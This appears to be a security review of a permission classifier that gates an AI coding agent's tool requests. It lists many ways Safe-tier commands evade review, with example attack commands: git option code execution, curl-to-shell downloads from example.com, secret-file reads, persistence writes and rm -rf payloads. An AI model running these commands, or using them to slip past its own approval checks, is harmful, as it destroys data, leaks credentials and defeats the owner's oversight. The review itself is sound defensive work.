# Tier design-oversight review (APR-O1, Q4)

Date: 2026-10-02. Run deck-m2c, Task 35. Status: **resolved by the owner on 2026-10-02 (D-75 to D-83)**,
see [14-decisions.md](../14-decisions.md). The review run itself changed nothing in
[07-approvals.md](../07-approvals.md) or any other doc; run deck-m3a Task 1 applied the resolution
there (07-approvals section 12).

## 1. Scope and method

The question this review answers is the one in 07-approvals section 12: where can a wrong default cost
the owner data, or let a risky action through with one click? It covers 07-approvals sections 1 to 12,
read together with [interaction/state-machines.md](../interaction/state-machines.md) section 2,
[screens/needs-you-drawer.md](../screens/needs-you-drawer.md), [03-architecture.md](../03-architecture.md)
section 4.3, [08-security.md](../08-security.md) and [04-integrations.md](../04-integrations.md) sections
2.4 and 5.

The owner decisions of 2026-10-02 are applied as settled: Caution is never approved from a popup, the
popup offers "Open" (SM-O9, DRW-O4); Destructive entries carry a confirm label template with the fallback
"I checked what this command will change" (DRW-O1); terminal approvals count toward "Make it a rule?"
(SM-O10); a Safe request that matches no tiers.json pattern gets no rule suggestion (SM-O11).

"One click" in this review means any of the Safe paths: a popup "Allow once", the batch "Allow both Safe
once" / `Alt Shift A`, or a rule written after the threshold, after which Claude Code stops asking at all.
Caution is one click too, but one request at a time with the command on screen.

Evidence comes in three kinds, and each finding says which it has:

- **Ran (tool)**: the command was run in a throwaway git repository and a throwaway directory during this
  review, with git, Node 26, coreutils and rsync from the review machine, and the effect was observed (a
  marker file appeared, a remote branch disappeared).
- **Ran (M1)**: the command was passed to the M1 classifier, `permissionTier` in
  `hub/server/machines/request.mjs:742`. That function returns only `caution` or `destructive`; it never
  returns Safe. The Safe tier, the tiers.json layering and the section 4.3 tables do not exist in code
  yet, so every finding about Safe is about the design as written in 07-approvals, not about running code.
- **Not run**: stated from the tool's documentation, and marked unverified. Two of these (GNU `sed`'s `e`
  and `w` commands, `rg --pre`) were refused by the review's own sandbox, which could not show what program
  they would run; they were therefore not executed here.

Severity: **high** means data loss, or a Destructive-class action reached through a Safe path or with no
review; **medium** means the action is reviewed but at a lower tier or with less information than the
policy intends; **low** means a gap in the spec that does not by itself let anything through.

## 2. Findings at a glance

| # | Severity | Concerns | One-line summary |
|---|---|---|---|
| F1 | high | 4.3 git Safe row | Global options and output options turn Safe git reads into code execution or writes anywhere |
| F2 | high | 4.3 General shell Safe row | "Read-only" Safe commands that execute programs or write files through options |
| F3 | high | 4.3 npm, cargo, go, python Safe rows; 6 rule candidates | Runner flags load arbitrary code, and the suggested prefix rule allows them forever |
| F4 | high | 3.5, APR-O2, section 12 Q1 | Safe in-repo edits reach files that later Safe commands, the owner's shell or Claude Code execute |
| F5 | high | state-machines 2.5 (Safe, Focus bar option 2) | Option 2 on a Safe edit switches the whole session to accept edits |
| F6 | high | 4.3 git and General shell Destructive rows | Data-loss git and rsync forms that land in Caution: abbreviations, missing entries, a config that arms a later push |
| F7 | medium | 3.4 network-to-interpreter floor, APR-O4 | `bash -c "$(curl ...)"` and `curl -o f && sh f` miss the design floor; `\| dash` misses only the M1 code |
| F8 | medium | 3.3, 3.2 step 5 | Wrappers that run a payload elsewhere (`docker run`, `ssh`) and non-literal command words hide `rm` |
| F9 | medium | 3.5 sensitive paths, 3.4 deck-controls floor | Bash reads of secret files are Safe while `Read` of the same file is Caution; the token floor needs a literal path |
| F10 | medium | 3.5 outside repo scope | Writes to startup and persistence locations are plain Caution; a worktree can move "inside the repo" anywhere |
| F11 | medium | 2 popup row, `requestPopupText` | A Safe popup shows a clipped command, so "Allow once" can approve text the owner never saw |
| F12 | medium | 5.1 screenMatch, state-machines 2.9 case 3 | Prefix matching up to the screen's truncation point can send a Safe answer to a different prompt |
| F13 | medium | 7.3 rules added by hand | The refusal check looks only at Destructive entries; wrapper and tool-wide rules reach floors |
| F14 | medium | APR-O3 `git add` / `git commit` Safe | Safe `git add -f` stages ignored secrets; `git commit -n` is `--no-verify` |
| F15 | low | 3.3 runner wrappers, 4.3 installs | Wrapper options (`uv run --with`) and install-time scripts are unspecified |
| F16 | low | 4.3 `npm run test*`, 6, 7.1 | Script-name globs and prefix-rule word boundaries are unpinned |
| F17 | low | 3.1 inputs, 5.1 deny | No PermissionRequest fixture for Bash or Edit; the Edit prompt's deny label is "No" |

## 3. Findings

### F1 (high): Safe git reads that execute code or write files through options

**Concerns:** 4.3 git Safe row (`git status`, `diff`, `log`, `show`, `grep`, `commit`), and the env
floor in 3.4, which lists `GIT_*` assignments but not their command-line equivalents.

**Commands:**

- `git -c core.fsmonitor='rm -rf /home/you/work' status` runs the configured command. Ran (tool): with
  `core.fsmonitor` set to a command that creates a marker file, `git status` created the marker.
- `git -c core.hooksPath=/dev/null commit -m wip` commits with no hooks, which is what
  `commit --no-verify` does and what 4.3 keeps out of Safe. Ran (tool) for the short flag instead:
  `git commit -n` committed past a pre-commit hook that rejected the plain `git commit`.
- `git diff --output=/home/you/.bashrc` overwrites a file outside the repo. Ran (tool): `git diff
  --output=<path outside the repo>` created that file. `log` and `show` take the same diff options
  (from git's documentation; not run).
- `git grep -O'<command>' <pattern>` runs `<command>` on the matching files. Ran (tool): the command
  created its marker file.

**Why it matters:** the `--output` and `-O` forms match the Safe `git diff`, `log`, `show` and `grep`
entries directly, so they batch and can be allowed from a popup. The two `-c` forms are Safe only if the
matcher skips git's global options before matching the `git status` or `git commit` prefix; 3.3 says an
entry "names a command prefix as tokens" and does not say whether it does. Read literally, `git -c k=v
status` matches no entry and is Unknown (Caution). Either way no row or floor makes it Destructive, which
is the tier a `.git/config` write of the same key gets. Ran (M1): the M1
classifier returns `caution` for the fsmonitor and `--output` forms, so today's read-only display is not
affected; the risk is in the M3 Safe table.

**Proposed change:**

1. Any git global option other than `--no-pager`, `-P` and `-C <dir inside the repo scope>` makes a Safe
   git entry Caution. A `-c` whose key is `core.fsmonitor`, `core.hooksPath`, `core.pager`,
   `core.sshCommand`, `core.editor`, `alias.*`, `diff.external`, `*.textconv`, `filter.*`, `include.*` or
   `includeIf.*` is Destructive, for the same reason the `.git/config` floor is.
2. `--output=<f>` and `--output <f>` on `diff`, `log`, `show` are classified as a redirect to `<f>` (3.3
   redirect row).
3. `git grep -O`, `--open-files-in-pager` is Caution.
4. The Safe `git commit` entry lists `-n` beside `--no-verify` in `noneArg`.

### F2 (high): "read-only" Safe commands that execute or write through options

**Concerns:** 4.3 General shell Safe row, which matches by command word and only excludes `sed -i` and
`find -delete`/`-exec`/`-execdir`/`-ok`.

**Commands:**

- `sort -o /home/you/.bashrc /dev/null` and `uniq /dev/null /home/you/.bashrc` truncate a file outside the
  repo. Ran (tool): `sort -o <file> <input>` and `uniq <input> <file>` both created and wrote the output
  file. Ran (M1): `uniq /dev/null /home/you/.bashrc` is `caution` today; under 4.3 it is Safe because
  `uniq` is on the Safe list and its operands are not analysed as write targets.
- `sed -n '1e rm -rf /home/you/work' notes.txt` runs a command (GNU `sed` `e` command, and the `e` flag of
  `s///`); `sed -n 'w /home/you/.bashrc' notes.txt` writes a file. Not run: the review sandbox refused
  both. From the GNU sed manual.
- `rg --pre ./x.sh pattern` runs `./x.sh` for every searched file; `fd . -x <command>` and `-X` run a
  command per result. Not run (`rg --pre` was refused by the review sandbox); from the ripgrep and fd
  manuals.
- `find . -fprint /home/you/.bashrc` writes a file, and `-okdir` runs a command; 4.3 excludes `-ok` but
  not `-okdir`, `-fprint`, `-fprintf` or `-fls`. From the findutils manual; not run.

**Proposed change:** turn the General shell Safe row from "command word plus a short exclusion list" into
"command word plus an allowlist of options". Any option not on the list makes the entry Caution. Output
options (`sort -o`, `uniq`'s second operand, `find -fprint*`/`-fls`, `tree -o`) are classified as redirect
targets. `sed` is Safe only when its script is a literal containing no `e`, `w`, `W`, `r` or `R` command
and no `e` or `w` flag on `s`; otherwise Caution. `rg --pre`, `--pre-glob`, `fd -x`/`-X`/`--exec`/
`--exec-batch` and `find -okdir` are Caution.

### F3 (high): runner flags that load arbitrary code, made permanent by the rule

**Concerns:** 4.3 Safe rows for npm/node, cargo, go and python, and their rule candidates
(`Bash(node --test:*)`, `Bash(cargo test:*)`, `Bash(go test:*)`, `Bash(pytest:*)`); section 6.

**Commands:**

- `node --test --import='data:text/javascript,import fs from "node:fs"; fs.writeFileSync("x", "x")' a.test.mjs`
  runs inline code before the tests. Ran (tool): the marker file appeared and the test run still
  reported normally. `--require <file>` does the same from a file.
- `go test -exec '<command>' ./...` and `-toolexec`, `cargo test --config 'build.rustc-wrapper="<path>"'`
  and `--config 'target.<triple>.runner="<command>"'`, `pytest -p <module>` and `-c <file>`,
  `npm test --script-shell=<path>`, `npx vitest run --config /tmp/x.config.mjs`. Not run (no Go toolchain
  on the review machine; the others need a project); from each tool's documentation.

The env floor in 3.4 already treats `NODE_OPTIONS`, `RUSTC_WRAPPER` and `CARGO_*` as "changes what cargo
test actually runs"; these flags are the same lever on the command line, and they are not floored.

**Why high:** after five benign `cargo test` approvals the suggested rule `Bash(cargo test:*)` is written
to `.claude/settings.local.json`. A Claude Code prefix rule cannot carry `noneArg`, so from then on
`cargo test --config '...runner=...'` runs with no prompt at all, in the deck and in a plain terminal.

**Proposed change:**

1. Each runner's Safe entry gets a `noneArg` list of its code-loading flags (`--import`, `--require`, `-r`,
   `--loader`, `--experimental-loader`, `--env-file` for node; `--config`, `-Z`, `--target-dir` outside
   the repo for cargo; `-exec`, `-toolexec`, `-vettool`, `-overlay` for go; `-p`, `-c`, `--rootdir`,
   `--confcutdir` for pytest; `--script-shell`, `--node-options`, `--prefix` for npm; `--config`, `-c` for
   the npx tools). A match falls through to Caution.
2. Because the rule cannot express `noneArg`, either stop suggesting rules for runners whose flags can load
   code (all of the above), or accept that the rule is a wider grant than the approvals that earned it and
   say so in the suggestion copy. This is owner question Q3.

### F4 (high): Safe in-repo edits reach code that something else executes

**Concerns:** 3.5 (in-repo `Edit`, `Write` Safe, APR-O2), 3.4 Claude Code settings floor, section 12
question 1.

**Commands (each is a Safe `Edit` inside the repo under 3.5):**

- `Edit .cargo/config.toml` adding `[build] rustc-wrapper = "/tmp/x"` or a `target.<triple>.runner`; then
  `cargo test`, which is Safe and may already be a rule. The env floor makes `RUSTC_WRAPPER=... cargo test`
  Caution, but the config file that does the same thing is a Safe edit.
- `Edit package.json` scripts, `Makefile`, `build.rs`, `conftest.py`, `.npmrc`, `.husky/*`, a directory
  named by `core.hooksPath`: each is executed by a later Safe command (`npm test`, `cargo build`,
  `pytest`, `git commit`). 4.3 already concedes this for `package.json`.
- `Edit .envrc`: direnv, where installed, runs it in the owner's own shell on the next `cd`, outside
  Claude Code and outside the deck. Whether the owner uses direnv is owner question Q4.
- `Edit .claude/hooks/pre.sh` in the repo: 3.4 names only `~/.claude/hooks/`. Ran (M1): the M1 classifier
  returns `destructive` for `/home/you/repo/.claude/hooks/pre.sh` (the regex at
  `hub/server/machines/request.mjs:684` matches any `.claude/hooks/`), so code is stricter than the doc.
- `Edit .claude/commands/<name>.md`, `.claude/agents/*.md`, `.claude/skills/**`: these carry instructions
  and, per Claude Code's documentation, an `allowed-tools` grant used when the command or skill runs. Not
  verified against the pinned version. Ran (M1): `caution` today for `.claude/commands/ship.md`.

**Why high:** the chain "Safe edit, then Safe runner" is two one-click approvals (or one, when the runner
is already a rule) that end in arbitrary code as the owner's user, with no Caution row anywhere. 08-security
3.6 accepts that a Safe runner executes agent-written code; this finding is that the floors in 3.4 were
written for the env-var and settings-file forms of that lever and miss the config-file forms.

**Proposed change:** add an "execution config" path list for `Edit`, `Write`, `MultiEdit` that raises an
in-repo edit to Caution with the description "changes what a build, test or hook runs":
`.cargo/config*`, `build.rs`, `package.json`, `.npmrc`, `.yarnrc*`, `Makefile`, `justfile`,
`conftest.py`, `pyproject.toml`, `setup.py`, `go.mod`, `.envrc`, `.husky/**`, `.githooks/**`,
`.github/workflows/**`, `.claude/commands/**`, `.claude/agents/**`, `.claude/skills/**`. Align the 3.4 floor text with the code: `<any>/.claude/hooks/`,
not only `~/.claude/hooks/`.

### F5 (high): Focus option 2 on a Safe edit switches the session to accept edits

**Concerns:** state-machines 2.5 Safe row ("Focus bar also shows option 2 ('Yes, don't ask again for
…')"), 07-approvals section 2 Focus row ("options 1, 2, 3" for Safe).

**Evidence:** the captured 2.1.282 Edit prompt (`hub/test/fixtures/screens/2.1.282/permission-edit.expect.json`)
has option 2 "Yes, and switch to accept edits (auto-approve file edits and common file commands) for this
session (shift+tab)". It is not a "don't ask again for <pattern>" rule; it changes the session's
permission mode.

**Why high:** per the label, after that one click later file edits and "common file commands" in the
session are auto-approved. If no `PermissionRequest` arrives for them, the deck never classifies them and
no floor applies; that this is what happens is inferred from the label, not observed.
Which commands those are, and whether Claude Code still prompts for its own settings files in that mode,
was not verified (it needs a real Claude Code session, which this task may not start).

**Proposed change:** the Focus bar shows option 2 only when the parsed label is a "don't ask again for
<pattern>" whose pattern equals the deck's own rule candidate for the request. Never for file tools.
Otherwise options 1 and 3 only, as for Caution.

### F6 (high): data-loss git and rsync forms that land in Caution

**Concerns:** 4.3 git Destructive row, General shell Destructive row (`rsync --delete*`), and `git config`
(set) in the git Caution row.

**Commands:**

- **Option abbreviation.** git accepts any unambiguous prefix of a long option. Ran (tool):
  `git reset --har` did a hard reset (the modified file was restored), `git clean --forc` removed an
  untracked file, and `git push --force-w origin HEAD:main` printed "(forced update)". `git push --forc`
  is rejected as ambiguous. Ran (M1): all three return `caution`; the anyArg lists in 4.3 match exact
  spellings only.
- **Missing entries.** Ran (tool): `git push --prune origin 'refs/heads/*:refs/heads/*'` deleted a remote
  branch ("- [deleted] other"); `git checkout -f main` discarded an uncommitted change. Also not in any
  Destructive row: `git switch --discard-changes`/`-f`, `git checkout -B`/`git switch -C` (resets an
  existing branch), `git rm -f`/`-rf`, `git restore --staged --worktree` (the "without `--staged`"
  exception lets it through), `git gc --prune=now` after a reset. Ran (M1): `git push --prune`,
  `git checkout -f`, `git switch --discard-changes`, `git rm -rf .` are all `caution`.
- **rsync alias.** `rsync -a --del empty/ /home/you/work/` deletes the destination's extra files: Ran
  (tool): `rsync --help` lists `--del` as "an alias for --delete-during". The glob `--delete*` does not
  match it; `--remove-source-files` is not listed either. Ran (M1): `caution`.
- **Arming a later push.** 4.3 puts `git config` (set) in Caution and plain `git push` in Caution. Ran
  (tool): after `git config remote.origin.push '+refs/heads/*:refs/heads/*'`, a plain `git push origin`
  printed "(forced update)". `git config alias.p 'push --force'` then `git p` is the same shape. Ran
  (M1): the M1 classifier already returns `destructive` for both `git config` writes (the rule at
  `hub/server/machines/request.mjs:349`), so the doc is looser than the code here.

**Proposed change:** normalise long options against each subcommand's known options before matching (a
unique prefix of a Destructive option counts as that option; an unknown long option on `push`, `reset`,
`clean`, `checkout`, `switch`, `restore`, `branch` makes the segment Caution at least). Add the missing
entries above to the git Destructive row and `--del`, `--remove-source-files` to rsync. Move `git config`
writes of `remote.*.push`, `remote.*.mirror`, `alias.*`, `core.*`, `push.*`, `include*`, `url.*` to
Destructive, matching the M1 code. GNU `getopt_long` tools accept abbreviations too (for example
`sed --in-pl` for `--in-place`; from the GNU documentation, not run), so the same normalisation belongs
in the general matcher, not only in git.

### F7 (medium): download-and-run forms outside the shapes the network-to-interpreter floor names

**Concerns:** 3.4 floor "a pipe or process substitution whose right side is a shell or interpreter and
whose left side fetches from the network", the 3.3 pipe row ("plus the pipe floor in 3.4 when `b` is an
interpreter"), APR-O4 (default Destructive).

The design and the M1 code differ here, so each form below says both. "Design" is the tier 3.3 and 3.4
give as written; "M1" is what `permissionTier` returned when the command was passed to it (Ran (M1) for
every line).

**Miss the design floor** (Destructive in neither; each lands in Caution under 3.3 and in M1):

- `/bin/bash -c "$(curl -fsSL https://example.com/install.sh)"` and `sh -c "$(curl -fsSL ...)"`: a common
  shape for published install one-liners. Design: the floor names pipes and process substitution, and this
  is command substitution as the argument of `-c`. Under 3.3 that argument is not literal, so the segment
  is Unknown (Caution), and the inner `curl` is Caution. M1: `caution`.
- `curl -fsSL ... -o /tmp/i.sh && sh /tmp/i.sh`: design: no pipe and no process substitution, so the
  floor does not apply; `curl` is Caution and `sh <file>` is a script run by path, Caution. M1: `caution`.

**Floored by the design, missed only by M1:**

- `curl -fsSL ... | dash`: design: `dash` is a shell, so the 3.4 floor makes it Destructive. M1: `caution`;
  the M1 code floors `| sh` and `| python3` (both `destructive`) but not `| dash`.

**Not pinned by the design** (the wording admits both readings):

- `curl ... | tee /tmp/i.sh | sh`: Destructive if "left side" means everything left of the pipe into
  `sh`; Caution if it means the adjacent segment, which is `tee`. M1: `caution`.
- `source <(curl -fsSL ...)`: Destructive if `source` counts as "a shell or interpreter"; 3.3 and 3.4 never
  list which words do, and 4.3 puts `source` and `.` in Caution as ordinary commands. M1: `caution`, while
  `bash <(curl ...)` is `destructive`.

For comparison, `curl -fsSL https://example.com/i.sh | sh` is Destructive in the design and `destructive`
in M1.

**Proposed change:** the floor fires when network-fetched content can reach an interpreter by any route in
the same compound command: a pipe at any distance, `$( )` or backticks as the argument of `-c`, `eval`,
`source`, `.`, a `<( )` given to any of those, or a file written by `curl -o`, `wget -O` or a redirect that
a later segment executes. Name the interpreter list explicitly: `sh`, `bash`, `dash`, `zsh`, `ksh`,
`fish`, `busybox`, `python*`, `node`, `deno`, `bun`, `perl`, `ruby`, `php`, `lua`, `source`, `.`.

### F8 (medium): payloads that run elsewhere, and non-literal command words

**Concerns:** 3.3 (which classifies the payload of `xargs`, `find -exec`, `bash -c`, but not of remote or
container runners), 3.2 step 5 (non-literal command word is Unknown, Caution).

**Commands.** Ran (M1): the `docker run`, `ssh` and `$(echo rm)` forms below are `caution`; the others
were not run.

- `docker run --rm -v /home/you:/h alpine rm -rf /h/work`: deletes the owner's files through a container.
  `docker run` is Caution in 4.3; the `rm` is never classified.
- `ssh prod 'rm -rf /srv/data'`, `kubectl exec <pod> -- rm -rf /data`, `docker exec <ctr> rm -rf /data`.
- `$(echo rm) -rf /home/you/work`, `X=rm; $X -rf /home/you/work`: the command word is not literal, so the
  segment is Unknown and stays Caution with no confirm checkbox.

**Proposed change:** treat `ssh <host> <cmd>`, `docker run|exec <...> <cmd>`, `podman run|exec`,
`kubectl exec ... -- <cmd>` as wrappers whose payload is classified like `bash -c`, with a Caution floor.
A `docker run` that mounts the home directory or `/` (`-v /home/you:...`, `-v /:...`, `--privileged`) is
Destructive. A non-literal command word is Destructive instead of Caution: agents rarely need one, and
"Unknown defaults to Caution" is Decided, so this needs the owner (Q5).

### F9 (medium): secret reads through Bash, and a token floor that needs a literal path

**Concerns:** 3.5 sensitive paths (applied to `Read` only), 3.4 deck-controls floor.

**Commands:**

- `cat ~/.ssh/id_ed25519`, `cat .env`, `cat ~/.claude/.credentials.json`, `grep -r . ~/.aws`: `cat` and
  `grep` are Safe in 4.3 and their path arguments are not checked against the 3.5 list, so these are Safe
  (batch, popup), while `Read ~/.ssh/id_ed25519` is Caution "reads a secret file".
- `cat /home/you/.config/fleet*/deck/token` and `find /home/you -name token -exec cat {} +` read the deck
  token without naming its path literally. Ran (M1): both `caution` (the floor's regex needs the literal
  `.config/fleetmates/deck`). In the design the `cat` form is Safe under 4.3. The `find` form is Safe if
  the `find` segment takes its payload's tier, and Caution if the `find` segment itself counts, since the
  Safe row excludes `find -exec` and 3.3 does not say which. Neither reading reaches the Destructive floor.
  08-security 3.6 says the agent "has to ask the owner for exactly that, in red"; these two do not.

**Proposed change:** apply the 3.5 sensitive-path list to path arguments of Bash read commands (Caution,
"reads a secret file"). Expand globs read-only against the filesystem before matching the floors, and treat
a recursive read (`grep -r`, `rg`, `find`, `tar`, `cp -r`) whose root is an ancestor of a deck control as
the floor. Extend the secret list with `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`, `~/.docker/config.json`,
`~/.kube/config`, `~/.config/gcloud/**`, `~/.password-store/**`, `~/.local/share/keyrings/**`, `*.pem`,
`id_*` private keys, `.envrc`.

### F10 (medium): persistence locations outside the repo are plain Caution

**Concerns:** 3.5 "Outside repo scope: Caution", and the repo scope definition (every worktree counts as
inside).

**Commands.** Ran (M1): `Edit` of `~/.bashrc`, `~/.config/autostart/x.desktop` and `~/.local/bin/git` is
`caution`. Under 3.5 every path below is Caution "writes outside the repo", the same as writing `/tmp/x`.

- `Write ~/.bashrc`, `~/.profile`, `~/.zshrc`; `~/.config/autostart/x.desktop`;
  `~/.config/systemd/user/x.service`; `~/.ssh/authorized_keys`; `~/.local/bin/git` (shadows `git` on the
  PATH for every later command, including the deck's own git calls); window-manager config files that run
  commands at login.
- `git worktree add ~/.config/autostart` (Caution) makes that directory a worktree of the repo; from then
  on 3.5 counts writes there as inside the repo scope, so `Write ~/.config/autostart/x.desktop` is Safe.
  Not run; follows from the scope definition in 3.5.

**Proposed change:** a persistence floor, Destructive, for writes (file tools, redirects, `cp`, `mv`, `ln`,
`tee`) to shell startup files, `~/.config/autostart/`, `~/.config/systemd/user/`, `~/.ssh/`, `~/.gitconfig`
and `~/.config/git/`, every directory on the session's `PATH`, and the owner's window-manager config
directory. A worktree counts as repo scope only when it is not under `$HOME/.*` and not under a persistence
location. Owner question Q6 covers which window-manager paths to list.

### F11 (medium): the Safe popup shows a clipped command

**Concerns:** section 2 "Desktop popup 'Allow once': Safe yes", `requestPopupText` in
`hub/server/machines/notification.mjs`, `BODY_MAX = 200` in `hub/server/adapters/notify.mjs:48`.

**Evidence:** Ran (M1 code): `requestPopupText('rustot', [{ summary, tier: 'safe' }], false)` with a
221-character `node --test ... --import=data:...execSync("rm -rf /home/you/work"))` summary returned a body
that ends `...then(c=>c.execS…`. The part that deletes is not on the popup.

This is a design gap shown with M1 code, not a defect M1 has today: M1 popups carry no answer buttons
(`grep -n -i action hub/server/adapters/notify.mjs` finds nothing), and M1 never classifies a request as
Safe. The design gap is that section 2 lets a Safe popup offer "Allow once" without requiring it to show
the whole command; that M3 will build its popup body on this M1 helper is an assumption.

**Proposed change:** the popup offers "Allow once" only when every request's summary is shown whole and
there is a single request; otherwise "Open" only. A clipped popup is a review the owner did not get.

### F12 (medium): prefix screen matching can answer a different prompt

**Concerns:** 5.1 guard 2 ("command text equal up to the screen's truncation point"), state-machines 2.9
case 3, 5.1 `expectPrompt.commandPrefix`.

**Command:** a session with two open requests, A `npm test -- --grep "<long name>"` (Safe) and B the same
text followed by `; rm -rf /home/you/work` (Destructive). If the screen truncates both at the same point,
A is `on_screen` while B is the prompt actually shown, and an "Allow once" on A (from a popup or a batch)
types "1" into B. 07-approvals section 10 already expects "a second subagent request" in one session. Not run: it needs real screens of
a long prompt, and whether 2.1.282 truncates the command line at all is not captured in the fixtures.

**Proposed change:** when the visible prompt is truncated, deckd refuses the write if more than one open
request of the session matches the visible prefix, or if any matching request has a higher tier than the
one being answered. Add a long-command screen fixture before M3 so the truncation rule is measured, not
assumed.

### F13 (medium): hand-added rules that reach floors

**Concerns:** 7.3, which refuses "a Bash pattern whose prefix could reach a Destructive entry", and accepts
tool-wide `Edit`/`WebFetch` with a warning.

**Commands:** `Bash(env:*)`, `Bash(xargs:*)`, `Bash(timeout:*)`, `Bash(uv run:*)`, `Bash(npx:*)`,
`Bash(bash:*)`, `Bash(python:*)`, `Bash(make:*)`, `Bash(sed:*)`, `Bash(curl:*)`. Each prefix reaches every
Destructive command or floor through its payload or its options, but none is a Destructive *entry*, so a
literal reading of 7.3 accepts them as Caution rules. A tool-wide `Edit` rule also covers
`.claude/settings.local.json` itself; whether Claude Code 2.1.282 still prompts for edits to its own
settings under such a rule was not verified.

**Proposed change:** 7.3 refuses, with the same Decided copy, any prefix whose command word is a wrapper,
shell, interpreter or runner (the 3.3 wrapper and runner lists, the F7 interpreter list, `make`, `just`,
`sed`, `awk`, `find`, `xargs`, `git -c`), and tool-wide `Edit`, `Write`, `MultiEdit`, `NotebookEdit`.

### F14 (medium): `git add` and `git commit` as Safe (APR-O3)

**Concerns:** 4.3 git Safe row, APR-O3.

**Commands:**

- `git add -f .env && git commit -m wip`: `-f` stages a file `.gitignore` excludes; both halves are Safe,
  so the compound is Safe and batches. The secret then leaves the machine on the next push, which the owner
  sees as a plain `git push`.
- `git add -A && git commit -m wip` in a repo whose ignore rules miss a key file.
- `git commit -n -m wip`: Ran (tool), as in F1: `-n` skipped a rejecting pre-commit hook.

**Proposed change:** keep plain `git add <paths>` and `git commit` Safe, but `git add -f`/`--force`, and any
`git add` whose pathspec matches the 3.5 sensitive list, is Caution "stages a secret file". `-n` joins
`--no-verify` in the commit entry's `noneArg`.

### F15 (low): wrapper options and install-time code

**Concerns:** 3.3 runner wrappers, 4.3 Caution installs.

- `uv run --with <pkg> pytest`: 3.3 strips `uv run` and lets the wrapped command decide, but does not say
  what happens to wrapper options. If the stripper skips options, this is Safe `pytest` that installs and
  imports `<pkg>`; if it stops at the first option, `--with` is the command word and the segment is
  Unknown, Caution. The spec does not say which.
- `uv run pytest` itself syncs the environment from `pyproject.toml`, which a Safe edit can change (F4).
- `npm install`, `pip install`, `npx <pkg>` run install scripts from the network: Caution, while
  `curl | sh` is Destructive (APR-O4). Not a defect; the owner should know the line is drawn there (Q2).

**Proposed change:** any option between a runner wrapper and the wrapped command makes the segment Caution.

### F16 (low): script-name globs and rule word boundaries

**Concerns:** 4.3 `npm run test*`, `npm run build*`, rule candidates `Bash(npm run test:*)`; 7.1; 6.

- `npm run test-and-publish` matches the Safe glob `test*`. 4.3 already notes that an agent can edit
  `package.json` scripts; the glob widens that to any script whose name starts with an allowed word.
- Whether `Bash(npm run test:*)` also allows `npm run test-and-publish` depends on Claude Code's prefix
  semantics for the `:*` form. Not verified; real Claude Code cannot run in this task.
- SM-O10 counts terminal approvals observed through hooks. Forged envelopes on `hooks.sock` (08-security
  T22) can therefore raise the counter and produce a "You allowed cargo test in rustot 5 times" line that
  is not true. It still needs the owner's click.

**Proposed change:** match script names exactly (`test`, `test:unit`, `lint`, `build`) or at a `:`
boundary, not as a free prefix. Add the word-boundary case to the pinned Claude Code tests in section 13.
Count only requests whose `PermissionRequest` and closing `PostToolUse` arrived from the same verified
session process.

### F17 (low): classifier inputs and the deny label

**Concerns:** 3.1 inputs, 5.1 deny.

- The 2.1.282 fixtures hold one `PermissionRequest`, for `AskUserQuestion`. The capture manifest records
  "no PermissionRequest(Bash); was the command already allowed?" for three Bash steps and "no
  PermissionRequest(Edit)" for the edit step; the captured payloads show `permission_mode: "auto"`. The
  inputs 3.1 relies on (`tool_input.command`, `tool_input.file_path`) are seen only in `PreToolUse`
  fixtures. The Bash `tool_input` also carries `description`, which is agent prose and must never feed the
  tier (08-security T14).
- Whether the payload `cwd` follows a `cd` from an earlier Bash call is not captured; relative redirect and
  path resolution in 3.3 and 3.5 depend on it.
- The Edit prompt's deny option is "3. No" (`permission-edit.expect.json`), not "No, tell Claude what to
  do" as 5.1 says Deny looks for. Under "never guess", Deny from the deck would fall back to the terminal
  for every edit.

**Proposed change:** recapture (owner authorised) with a permission mode that prompts, for Bash, Edit,
Write and WebFetch, before the corpus in section 13 is written. Match the deny option by its leading "No"
rather than the full label.

## 4. Where the defaults are sound

- **Highest tier wins, floors after matching, a Safe entry can never lower a match** (3.2 steps 3 and 4).
  Every finding above is a missing entry or a missing floor, not a flaw in this rule.
- **Unknown and unparsable default to Caution, and the tier only rises during a request** (3.2 steps 5 and
  6). Re-classifying every id at send time in a batch (5.4) is the right backstop for F1 to F3 once the
  entries are fixed.
- **`rm` is always Destructive**, inside or outside the repo (section 12 question 5). The friction for
  `rm -rf target/` is real, but every other Destructive rule here depends on the deck not judging which
  deletions are harmless. Keep it.
- **Layered tiers.json with non-disablable floors** (APR-O5): a user Safe entry cannot weaken a floor or a
  higher default. Keep it.
- **No rule from a compound command and no rule candidate for file edits** (3.5, 6): both stop one
  approval from becoming a broad grant.
- **Read-only `psql` as Caution, unknown SQL as Destructive** (section 12 question 6): the database target
  is unknown and may be production. Keep it.
- **The settings writer** (7.2): lstat and regular-file checks, refusal on unreadable JSON, backups outside
  the repo and re-read before rename cover the repo-supplied symlink and concurrent write cases.
- **Network-to-interpreter as Destructive** (APR-O4, section 12 question 3) is the right default; F7 is
  about its reach, not its level.
- **Screen match by deckd at write time, with the option digit taken from the parsed screen** (5.1): the
  right design; F12 is about the truncated case only.
- With SM-O9 settled, Caution and Destructive never act from a popup, which leaves F11 as the only popup
  path to check.

## 5. Answers to the section 12 questions

1. **Safe for runners that execute agent-editable code.** Acceptable only with F3 and F4: Safe can mean
   "intent and blast radius" only if the flags and config files that redirect what the runner executes are
   not themselves Safe. Without them, "Safe" covers arbitrary code with no Caution row on the way.
2. **In-repo edits Safe (APR-O2), `git add` / `git commit` Safe (APR-O3).** Yes for ordinary source files,
   with the execution-config list of F4 raised to Caution and the `git add -f` / `-n` cases of F14.
3. **Network-to-interpreter Destructive (APR-O4).** Yes; widen the floor as in F7.
4. **Layered tiers.json with fixed floors (APR-O5).** Yes.
5. **`rm` of build output Destructive.** Keep (section 4).
6. **Read-only `psql` as Caution.** Keep.
7. **Deck-controls floor wording.** The wording can only be honest once the floor catches indirect reads
   (F9). Until then, "an agent that wants to approve itself has to ask the owner for exactly that, in red"
   (08-security 3.6) overstates it.

Section 12 also asks the review to run the classification corpus of section 13. That corpus does not exist
yet (`hub/test/fixtures/tiers/` is absent), so it was not run; every command quoted in section 3 is a
proposed corpus case.

## 6. Questions only the owner can answer

- **Q1.** Accept F1, F2, F6 and F7 as "fix the entries and floors before M3", or treat any of them as
  accepted risk?
- **Q2.** Package installs that run network code (`npm install`, `pip install`, `npx <pkg>`) stay Caution
  while `curl | sh` is Destructive. Is that where you want the line?
- **Q3.** For test and build runners whose flags can load code (F3), should the deck stop suggesting rules,
  or suggest them with copy that says the rule allows any flags?
- **Q4.** Do you use direnv (or any tool that runs a repo file when you enter the directory)? It decides
